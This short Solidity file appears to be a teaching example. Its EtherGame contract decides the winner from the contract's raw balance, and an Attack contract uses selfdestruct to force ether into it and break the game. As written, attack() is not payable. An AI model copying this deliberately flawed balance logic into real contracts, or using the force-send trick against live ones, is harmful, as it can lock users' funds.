//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.1;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ehter");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack{
    function attack(address payable target) public {
        selfdestruct(target);
    }
}